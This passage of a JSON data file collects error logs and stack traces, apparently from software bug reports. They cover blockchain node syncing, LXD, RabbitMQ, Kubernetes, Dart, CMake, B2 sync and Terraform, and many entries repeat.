12D3KooWSPayd1AVbkQnoKNY31ct7REiME9F7Bi1Sy4ByZMKghZT, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 15.0kiB/s \u2b06 6.2kiB/s\r\nSep 28 21:10:00 ubuntu15 robonomics[730]: 2020-09-28 21:10:00 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWBBwauXVbCC3TvGvynyi58AwRZSGGLx7KBoKFfcfEbhHD, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:10:01 ubuntu15 robonomics[730]: 2020-09-28 21:10:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWGqrUyhEt4yPPSbGxosjLjdYWjkgJkusM135Tvm1a35AF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\""
    },
    {
        "logs": "user@hostname:~/src/homebrew-cask$ brew cask style --fix Casks/matterhorn.rb\r\nCasks/matterhorn.rb:1:1: C: Missing frozen string literal comment.\r\ncask \"matterhorn\" do\r\n^\r\n\r\n1 file inspected, 1 offense detected, 1 more offense can be corrected with "
    },
    {
        "logs": "{\r\n  method: 'POST',\r\n  uri: 'https://localhost:8443/1.0/instances/test-vm/exec?project=default',\r\n  rejectUnauthorized: false,\r\n  json: true,\r\n  body: {\r\n    command: [ 'ash' ],\r\n    environment: { HOME: '/root', TERM: 'xterm', USER: 'root' },\r\n    'wait-for-websocket': true,\r\n    interactive: true,\r\n    height: 24,\r\n    width: 83\r\n  }\r\n}"
    },
    {
        "logs": "{\r\n  method: 'POST',\r\n  uri: 'https://localhost:8443/1.0/instances/test-vm/exec?project=default',\r\n  rejectUnauthorized: false,\r\n  json: true,\r\n  body: {\r\n    command: [ 'ash' ],\r\n    environment: { HOME: '/root', TERM: 'xterm', USER: 'root' },\r\n    'wait-for-websocket': true,\r\n    interactive: true,\r\n    height: 24,\r\n    width: 83\r\n  }\r\n}"
    },
    {
        "logs": "rabbitio out -e PXC.TRIGGER -p 250 -q PXC.TRIGGER.PXC -r \\# -u 'amqp://usr:pass@some.rmq.host:5672/rmq-vhl' -d /dev/null/\r\n2022/02/02 20:00:01 RabbitMQ connected: amqp://user:pass@some.rmq.host:5672/rmq-vhl\r\n2022/02/02 20:00:01 Bind to Exchange: \"PXC.TRIGGER\" and Queue: \"PXC.TRIGGER.PXC\", Messaging waiting: 9843598\r\nError: open /dev/null/1_messages_1000.tgz: not a directory"
    },
    {
        "logs": "rabbitio out -e PXC.TRIGGER -p 250 -q PXC.TRIGGER.PXC -r \\# -u 'amqp://usr:pass@some.rmq.host:5672/rmq-vhl' -d /dev/null/\r\n2022/02/02 20:00:01 RabbitMQ connected: amqp://user:pass@some.rmq.host:5672/rmq-vhl\r\n2022/02/02 20:00:01 Bind to Exchange: \"PXC.TRIGGER\" and Queue: \"PXC.TRIGGER.PXC\", Messaging waiting: 9843598\r\nError: open /dev/null/1_messages_1000.tgz: not a directory"
    },
    {
        "logs": "apiVersion: kyverno.io/v1\r\nkind: ClusterPolicy\r\nmetadata:\r\n  name: deny-deployment-scaling\r\nspec:\r\n  validationFailureAction: enforce\r\n  background: true\r\n  rules:\r\n  - name: block-scaling-for-deployments\r\n    match:\r\n      resources:\r\n        kinds:\r\n        - Deployment\r\n    validate:\r\n      message: \"Changing {{request.object.kind}} {{request.operation}} {{request.object.spec.replicas}} {{request.oldObject.kind}}/{{request.oldObject.metadata.name}} is not allowed\"\r\n      deny: {}"
    },
    {
        "logs": " in your case, the parsing fails. So that explains the issue you are having.\r\n2. I can fix that easily - when the target type is "
    },
    {
        "logs": "I will change these names and remove the `NAME` suffix.\r\n\r\n`SERVLET` scope is aware of the _types_, too - meaning, if you put a `ServletReuest` field you don't need to use above reserved name:"
    },
    {
        "logs": "# Create a proper superuser that can be used to access the API\r\npython manage.py waffle_switch super-create-accounts on\r\n15:50:03 z.startup:INFO Set RECURSION_LIMIT to 10000 :/code/src/olympia/core/apps.py:75\r\n15:50:03 raven.contrib.django.client.DjangoClient:DEBUG Configuring Raven for host: <raven.conf.remote.RemoteConfig object at 0x7f7d5c74fb10> :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:265\r\n15:50:03 raven.contrib.django.client.DjangoClient:INFO Raven is not configured (logging is disabled). Please see the documentation for more information. :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:213\r\n15:50:03 raven.base.Client:DEBUG Configuring Raven for host: <raven.conf.remote.RemoteConfig object at 0x7f7d5bfe1950> :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:265\r\n15:50:03 raven.base.Client:INFO Raven is not configured (logging is disabled). Please see the documentation for more information. :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:213\r\nCommandError: This switch does not exist.\r\nMakefile-docker:129: recipe for target 'ui-tests' failed\r\nmake: *** [ui-tests] Error 1\r\nERROR: InvocationError: '/usr/bin/make -f Makefile-docker ui-tests'"
    },
    {
        "logs": "# Create a proper superuser that can be used to access the API\r\npython manage.py waffle_switch super-create-accounts on\r\n15:50:03 z.startup:INFO Set RECURSION_LIMIT to 10000 :/code/src/olympia/core/apps.py:75\r\n15:50:03 raven.contrib.django.client.DjangoClient:DEBUG Configuring Raven for host: <raven.conf.remote.RemoteConfig object at 0x7f7d5c74fb10> :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:265\r\n15:50:03 raven.contrib.django.client.DjangoClient:INFO Raven is not configured (logging is disabled). Please see the documentation for more information. :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:213\r\n15:50:03 raven.base.Client:DEBUG Configuring Raven for host: <raven.conf.remote.RemoteConfig object at 0x7f7d5bfe1950> :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:265\r\n15:50:03 raven.base.Client:INFO Raven is not configured (logging is disabled). Please see the documentation for more information. :/code/.tox/ui-tests/local/lib/python2.7/site-packages/raven/base.py:213\r\nCommandError: This switch does not exist.\r\nMakefile-docker:129: recipe for target 'ui-tests' failed\r\nmake: *** [ui-tests] Error 1\r\nERROR: InvocationError: '/usr/bin/make -f Makefile-docker ui-tests'"
    },
    {
        "logs": "Warning  FailedScheduling  18s (x7 over 49s)  default-scheduler  0/3 nodes are available: 1 PodToleratesNodeTaints, 3 NodeNotReady."
    },
    {
        "logs": "Dart analysis server, SDK version 2.2.1-edge.571ea80e1101e706980ea8aefa7fc18a0c8ba2ec, server version 1.24.0, error: Captured exception\r\nInvalid argument(s)\r\n#0      _TypedList._setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:2066:77)\r\n#1      _ByteDataView.setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:4264:16)\r\n#2      ApiSignature.addInt (package:analyzer/src/summary/api_signature.dart:95:11)\r\n#3      UnlinkedExprBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:22389:19)\r\n#4      UnlinkedExecutableBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:21432:21)\r\n#5      UnlinkedClassBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:19482:12)\r\n#6      UnlinkedUnitBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:25511:12)\r\n#7      _SummarizeAstVisitor._computeApiSignature (package:analyzer/src/summary/summarize_ast.dart:1401:7)\r\n#8      _SummarizeAstVisitor.serializeCompilationUnit (package:analyzer/src/summary/summarize_ast.dart:478:5)\r\n#9      serializeAstUnlinked (package:analyzer/src/summary/summarize_ast.dart:22:8)\r\n#10     FileState.refresh.<anonymous closure> (package:analyzer/src/dart/analysis/file_state.dart:476:46)\r\n#11     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#12     FileState.refresh (package:analyzer/src/dart/analysis/file_state.dart:475:26)\r\n#13     FileTracker.verifyApiSignature.<anonymous closure> (package:analyzer/src/dart/analysis/file_tracker.dart:231:32)\r\n#14     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#15     FileTracker.verifyApiSignature (package:analyzer/src/dart/analysis/file_tracker.dart:227:20)\r\n#16     FileTracker.verifyChangedFilesIfNeeded (package:analyzer/src/dart/analysis/file_tracker.dart:300:9)\r\n#17     AnalysisDriver.performWork (package:analyzer/src/dart/analysis/driver.dart:1080:22)\r\n<asynchronous suspension>\r\n#18     AnalysisDriverScheduler._run (package:analyzer/src/dart/analysis/driver.dart:2145:24)\r\n<asynchronous suspension>\r\n#19     AnalysisDriverScheduler.start (package:analyzer/src/dart/analysis/driver.dart:2075:5)\r\n#20     new AnalysisServer (package:analysis_server/src/analysis_server.dart:213:29)\r\n#21     SocketServer.createAnalysisServer (package:analysis_server/src/socket_server.dart:86:26)\r\n#22     StdioAnalysisServer.serveStdio (package:analysis_server/src/server/stdio_server.dart:37:18)\r\n#23     Driver.startAnalysisServer.<anonymous closure> (package:analysis_server/src/server/driver.dart:511:21)\r\n#24     _rootRun (dart:async/zone.dart:1124:13)\r\n#25     _CustomZone.run (dart:async/zone.dart:1021:19)\r\n#26     _runZoned (dart:async/zone.dart:1516:10)\r\n#27     runZoned (dart:async/zone.dart:1463:12)\r\n#28     Driver._captureExceptions (package:analysis_server/src/server/driver.dart:594:12)\r\n#29     Driver.startAnalysisServer (package:analysis_server/src/server/driver.dart:509:7)\r\n#30     Driver.start (package:analysis_server/src/server/driver.dart:412:7)\r\n#31     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:12:11)\r\n#32     _AsyncAwaitCompleter.start (dart:async/runtime/lib/async_patch.dart:49:6)\r\n#33     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:10:10)\r\n#34     _startIsolate.<anonymous closure> (dart:isolate/runtime/lib/isolate_patch.dart:298:32)\r\n#35     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/lib/isolate_patch.dart:171:12)"
    },
    {
        "logs": "Dart analysis server, SDK version 2.2.1-edge.571ea80e1101e706980ea8aefa7fc18a0c8ba2ec, server version 1.24.0, error: Captured exception\r\nInvalid argument(s)\r\n#0      _TypedList._setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:2066:77)\r\n#1      _ByteDataView.setUint32 (dart:typed_data/runtime/lib/typed_data_patch.dart:4264:16)\r\n#2      ApiSignature.addInt (package:analyzer/src/summary/api_signature.dart:95:11)\r\n#3      UnlinkedExprBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:22389:19)\r\n#4      UnlinkedExecutableBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:21432:21)\r\n#5      UnlinkedClassBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:19482:12)\r\n#6      UnlinkedUnitBuilder.collectApiSignature (package:analyzer/src/summary/format.dart:25511:12)\r\n#7      _SummarizeAstVisitor._computeApiSignature (package:analyzer/src/summary/summarize_ast.dart:1401:7)\r\n#8      _SummarizeAstVisitor.serializeCompilationUnit (package:analyzer/src/summary/summarize_ast.dart:478:5)\r\n#9      serializeAstUnlinked (package:analyzer/src/summary/summarize_ast.dart:22:8)\r\n#10     FileState.refresh.<anonymous closure> (package:analyzer/src/dart/analysis/file_state.dart:476:46)\r\n#11     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#12     FileState.refresh (package:analyzer/src/dart/analysis/file_state.dart:475:26)\r\n#13     FileTracker.verifyApiSignature.<anonymous closure> (package:analyzer/src/dart/analysis/file_tracker.dart:231:32)\r\n#14     PerformanceLog.run (package:analyzer/src/dart/analysis/performance_logger.dart:34:15)\r\n#15     FileTracker.verifyApiSignature (package:analyzer/src/dart/analysis/file_tracker.dart:227:20)\r\n#16     FileTracker.verifyChangedFilesIfNeeded (package:analyzer/src/dart/analysis/file_tracker.dart:300:9)\r\n#17     AnalysisDriver.performWork (package:analyzer/src/dart/analysis/driver.dart:1080:22)\r\n<asynchronous suspension>\r\n#18     AnalysisDriverScheduler._run (package:analyzer/src/dart/analysis/driver.dart:2145:24)\r\n<asynchronous suspension>\r\n#19     AnalysisDriverScheduler.start (package:analyzer/src/dart/analysis/driver.dart:2075:5)\r\n#20     new AnalysisServer (package:analysis_server/src/analysis_server.dart:213:29)\r\n#21     SocketServer.createAnalysisServer (package:analysis_server/src/socket_server.dart:86:26)\r\n#22     StdioAnalysisServer.serveStdio (package:analysis_server/src/server/stdio_server.dart:37:18)\r\n#23     Driver.startAnalysisServer.<anonymous closure> (package:analysis_server/src/server/driver.dart:511:21)\r\n#24     _rootRun (dart:async/zone.dart:1124:13)\r\n#25     _CustomZone.run (dart:async/zone.dart:1021:19)\r\n#26     _runZoned (dart:async/zone.dart:1516:10)\r\n#27     runZoned (dart:async/zone.dart:1463:12)\r\n#28     Driver._captureExceptions (package:analysis_server/src/server/driver.dart:594:12)\r\n#29     Driver.startAnalysisServer (package:analysis_server/src/server/driver.dart:509:7)\r\n#30     Driver.start (package:analysis_server/src/server/driver.dart:412:7)\r\n#31     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:12:11)\r\n#32     _AsyncAwaitCompleter.start (dart:async/runtime/lib/async_patch.dart:49:6)\r\n#33     main (file:///C:/b/s/w/ir/k/src/third_party/dart/pkg/analysis_server/bin/server.dart:10:10)\r\n#34     _startIsolate.<anonymous closure> (dart:isolate/runtime/lib/isolate_patch.dart:298:32)\r\n#35     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/lib/isolate_patch.dart:171:12)"
    },
    {
        "logs": "Error: Uncaught (in promise): Attempt to invoke virtual method 'boolean android.hardware.fingerprint.FingerprintManager.isHardwareDetected()' on a null object reference"
    },
    {
        "logs": " r\r\ntrees = parallel::mclapply(c(7L, 15L), igraphlite::graph_tree, mc.cores = 2L)\r\ntrees[[1L]]\r\n# Error in sprintf(\"C++ object <%s> of class '%s' <%s>\", externalptr_address(pointer), :\r\n#   external pointer is not valid"
    },
    {
        "logs": " r\r\ntrees = parallel::mclapply(c(7L, 15L), igraphlite::graph_tree, mc.cores = 2L)\r\ntrees[[1L]]\r\n# Error in sprintf(\"C++ object <%s> of class '%s' <%s>\", externalptr_address(pointer), :\r\n#   external pointer is not valid"
    },
    {
        "logs": "[100%] Completed 'rapidjson_external'\r\nmake[2]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\n[100%] Built target rapidjson_external\r\nmake[1]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\nCMake Error at cmake/build_helpers.cmake:129 (message):\r\n  Did not find this build in the environment variable PATH.  Please add\r\n  /home/adamm/ginkgo/build/windows_shared_library into the environment\r\n  variable PATH.\r\nCall Stack (most recent call first):\r\n  cmake/build_helpers.cmake:40 (ginkgo_check_shared_library)\r\n  core/devices/CMakeLists.txt:3 (ginkgo_compile_features)\r\n  core/devices/omp/CMakeLists.txt:1 (ginkgo_add_object_library)\r\n\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeOutput.log\".\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeError.log\"."
    },
    {
        "logs": "[100%] Completed 'rapidjson_external'\r\nmake[2]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\n[100%] Built target rapidjson_external\r\nmake[1]: Leaving directory '/home/adamm/ginkgo/build/third_party/rapidjson/download'\r\nCMake Error at cmake/build_helpers.cmake:129 (message):\r\n  Did not find this build in the environment variable PATH.  Please add\r\n  /home/adamm/ginkgo/build/windows_shared_library into the environment\r\n  variable PATH.\r\nCall Stack (most recent call first):\r\n  cmake/build_helpers.cmake:40 (ginkgo_check_shared_library)\r\n  core/devices/CMakeLists.txt:3 (ginkgo_compile_features)\r\n  core/devices/omp/CMakeLists.txt:1 (ginkgo_add_object_library)\r\n\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeOutput.log\".\r\nSee also \"/home/adamm/ginkgo/build/CMakeFiles/CMakeError.log\"."
    },
    {
        "logs": "$ b2 sync --keepDays 30 --excludeRegex '*' --includeRegex '*101*' --dryRun /mnt/bigboy/dump b2://devhost-vzdump/dump\r\nConsoleTool unexpected exception\r\nTraceback (most recent call last):\r\n  File \"b2/console_tool.py\", line 1500, in run_command\r\n  File \"b2/console_tool.py\", line 1282, in run\r\n  File \"b2/console_tool.py\", line 1306, in get_policies_manager_from_args\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 146, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in <listcomp>\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 250, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 302, in _compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_compile.py\", line 764, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 948, in parse\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 443, in _parse_sub\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 668, in _parse\r\nre.error: nothing to repeat at position 0\r\nTraceback (most recent call last):\r\n  File \"b2/console_tool.py\", line 1628, in <module>\r\n  File \"b2/console_tool.py\", line 1613, in main\r\n  File \"b2/console_tool.py\", line 1500, in run_command\r\n  File \"b2/console_tool.py\", line 1282, in run\r\n  File \"b2/console_tool.py\", line 1306, in get_policies_manager_from_args\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 146, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in <listcomp>\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 250, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 302, in _compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_compile.py\", line 764, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 948, in parse\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 443, in _parse_sub\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 668, in _parse\r\nre.error: nothing to repeat at position 0"
    },
    {
        "logs": "$ b2 sync --keepDays 30 --excludeRegex '*' --includeRegex '*101*' --dryRun /mnt/bigboy/dump b2://devhost-vzdump/dump\r\nConsoleTool unexpected exception\r\nTraceback (most recent call last):\r\n  File \"b2/console_tool.py\", line 1500, in run_command\r\n  File \"b2/console_tool.py\", line 1282, in run\r\n  File \"b2/console_tool.py\", line 1306, in get_policies_manager_from_args\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 146, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in <listcomp>\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 250, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 302, in _compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_compile.py\", line 764, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 948, in parse\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 443, in _parse_sub\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 668, in _parse\r\nre.error: nothing to repeat at position 0\r\nTraceback (most recent call last):\r\n  File \"b2/console_tool.py\", line 1628, in <module>\r\n  File \"b2/console_tool.py\", line 1613, in main\r\n  File \"b2/console_tool.py\", line 1500, in run_command\r\n  File \"b2/console_tool.py\", line 1282, in run\r\n  File \"b2/console_tool.py\", line 1306, in get_policies_manager_from_args\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 146, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in __init__\r\n  File \"site-packages/b2sdk/sync/scan_policies.py\", line 29, in <listcomp>\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 250, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/re.py\", line 302, in _compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_compile.py\", line 764, in compile\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 948, in parse\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 443, in _parse_sub\r\n  File \"/home/travis/virtualenv/python3.8.0/lib/python3.8/sre_parse.py\", line 668, in _parse\r\nre.error: nothing to repeat at position 0"
    },
    {
        "logs": "sh\r\nERROR: The requested resource requires user authentication: https://dev.azure.com/$project_id/AKS%20Demo/_apis/distributedtask/queues"
    },
    {
        "logs": "Status 500: {\"message\":\"Get \\\"https://XXX.jfrog.io/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\nTRACE    2021-09-13 13:32:15.370com.github.dockerjava.api.exception.InternalServerErrorException: Status 500: {\"message\":\"Get \\\"https://XXX/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\n\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.execute(DefaultInvocationBuilder.java:247)\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:269)\r\n\tat java.base/java.lang.Thread.run(Unknown Source)"
    },
    {
        "logs": "Status 500: {\"message\":\"Get \\\"https://XXX.jfrog.io/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\nTRACE    2021-09-13 13:32:15.370com.github.dockerjava.api.exception.InternalServerErrorException: Status 500: {\"message\":\"Get \\\"https://XXX/v2/\\\": net/http: request canceled (Client.Timeout exceeded while awaiting headers)\"}\r\n\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.execute(DefaultInvocationBuilder.java:247)\r\n\tat com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:269)\r\n\tat java.base/java.lang.Thread.run(Unknown Source)"
    },
    {
        "logs": "Error 263 for command:\r\n        close source/backend/sound/files/black-move.wav\r\n    The specified device is not open or is not recognized by MCI.\r\nFailed to close the file: source/backend/sound/files/black-move.wav"
    },
    {
        "logs": "Error 263 for command:\r\n        close source/backend/sound/files/black-move.wav\r\n    The specified device is not open or is not recognized by MCI.\r\nFailed to close the file: source/backend/sound/files/black-move.wav"
    },
    {
        "logs": "Error: error creating API Gateway v2 domain name (): BadRequestException: Error retrieving certificate from ACM: The certificate '' must have a fully-qualified domain name, a supported signature, and a supported key size.\r\n\r\n  on .terraform/modules/api-auth-proxy/modules/subdomain/apigateway.tf line 1, in resource \"aws_apigatewayv2_domain_name\" \"subdomain\":\r\n   1: resource \"aws_apigatewayv2_domain_name\" \"subdomain\" {"
    },
    {
        "logs": "I get this error when migrating a course achievement. Inspected the source code, there is a validation which calls the following method:"
    },
    {
        "logs": "          ID: foo\r\n    Function: cmd.run\r\n        Name: foo\r\n      Result: False\r\n     Comment: The following requisites were not found:\r\n                                 require:\r\n                                     sls: .baz\r\n     Started: \r\n    Duration: \r\n     Changes:   "
    },
    {
        "logs": "          ID: foo\r\n    Function: cmd.run\r\n        Name: foo\r\n      Result: False\r\n     Comment: The following requisites were not found:\r\n                                 require:\r\n                                     sls: .baz\r\n     Started: \r\n    Duration: \r\n     Changes:   "
    },
    {
        "logs": "function broadcast(value) { /* do something*/ } // send value to other computers or devices like osc, midi, etc.\r\nreceiver = new Receiver(); // receive value from other computers or devices.\r\n\r\nvar obj = {value: v};\r\ncontrolKit\r\n  .addPanel()\r\n  .addNumberInput(obj, 'value', {\r\n    onChange: function() { broadcast(obj.value); }\r\n  });\r\n\r\nreceiver.on('data', function(value) {\r\n  obj.value = value;\r\n  contolKit.update(); // <- but NumberInput doesn't change.\r\n});"
    },
    {
        "logs": "function broadcast(value) { /* do something*/ } // send value to other computers or devices like osc, midi, etc.\r\nreceiver = new Receiver(); // receive value from other computers or devices.\r\n\r\nvar obj = {value: v};\r\ncontrolKit\r\n  .addPanel()\r\n  .addNumberInput(obj, 'value', {\r\n    onChange: function() { broadcast(obj.value); }\r\n  });\r\n\r\nreceiver.on('data', function(value) {\r\n  obj.value = value;\r\n  contolKit.update(); // <- but NumberInput doesn't change.\r\n});"
    },
    {
        "logs": "kubectl api-resources  ## from kubernetes 1.11\r\nsee https://kubernetes.io/docs/reference/kubectl/cheatsheet/\r\n\r\nerror: unable to retrieve the complete list of server APIs: mutators.kubedb.com/v1alpha1: the server is currently unable to handle the request, validators.kubedb.com/v1alpha1: the server is currently unable to handle the request"
    },
    {
        "logs": "kubectl api-resources  ## from kubernetes 1.11\r\nsee https://kubernetes.io/docs/reference/kubectl/cheatsheet/\r\n\r\nerror: unable to retrieve the complete list of server APIs: mutators.kubedb.com/v1alpha1: the server is currently unable to handle the request, validators.kubedb.com/v1alpha1: the server is currently unable to handle the request"
    },
    {
        "logs": "bash\r\n{\r\n  \"timestamp\" : 1538008639775,\r\n  \"status\" : 500,\r\n  \"error\" : \"Internal Server Error\",\r\n  \"exception\" : \"java.lang.NullPointerException\",\r\n  \"message\" : \"No message available\"\r\n}"
    },
    {
        "logs": "bash\r\nspin-fiat-6b96d6447f-8vfx7 fiat 2018-09-27 00:37:19.725  INFO 1 --- [0.0-7003-exec-6] c.n.s.fiat.controllers.RolesController   : [] Full role sync invoked by web request.\r\nspin-fiat-6b96d6447f-8vfx7 fiat 2018-09-27 00:37:19.743  INFO 1 --- [0.0-7003-exec-6] c.n.s.fiat.roles.UserRolesSyncer         : [] Synced anonymous user role.\r\nspin-fiat-6b96d6447f-8vfx7 fiat 2018-09-27 00:37:19.774 ERROR 1 --- [0.0-7003-exec-6] c.n.s.f.r.ldap.LdapUserRolesProvider     : [] Unable to find a single user entry\r\nspin-fiat-6b96d6447f-8vfx7 fiat org.springframework.dao.IncorrectResultSizeDataAccessException: Incorrect result size: expected 1, actual 0\r\nspin-fiat-6b96d6447f-8vfx7 fiat \tat org.springframework.security.ldap.SpringSecurityLdapTemplate.searchForSingleEntryInternal(SpringSecurityLdapTemplate.java:361)\r\nspin-fiat-6b96d6447f-8vfx7 fiat \tat org.springframework.security.ldap.SpringSecurityLdapTemplate$3.executeWithContext(SpringSecurityLdapTemplate.java:318)\r\nspin-fiat-6b96d6447f-8vfx7 fiat \tat org.springframework.ldap.core.LdapTemplate.executeWithContext(LdapTemplate.java:817)\r\n..."
    },
    {
        "logs": "bash\r\n{\r\n  \"timestamp\" : 1538008639775,\r\n  \"status\" : 500,\r\n  \"error\" : \"Internal Server Error\",\r\n  \"exception\" : \"java.lang.NullPointerException\",\r\n  \"message\" : \"No message available\"\r\n}"
    },
    {
        "logs": "type Int64 has no field rows\r\n\r\nStacktrace:\r\n [1] getproperty(::Int64, ::Symbol) at ./Base.jl:33\r\n [2] length(::Parquet.ColCursor{String}) at ./In[39]:2\r\n [3] top-level scope at In[40]:1\r\n [4] include_string(::Function, ::Module, ::String, ::String) at ./loading.jl:1091"
    },
    {
        "logs": "type Int64 has no field rows\r\n\r\nStacktrace:\r\n [1] getproperty(::Int64, ::Symbol) at ./Base.jl:33\r\n [2] length(::Parquet.ColCursor{String}) at ./In[39]:2\r\n [3] top-level scope at In[40]:1\r\n [4] include_string(::Function, ::Module, ::String, ::String) at ./loading.jl:1091"
    },
    {
        "logs": "ERROR: Error doing post analysis query: Evaluation of query \"@external_001//...\" failed: no targets found beneath ''"
    },
    {
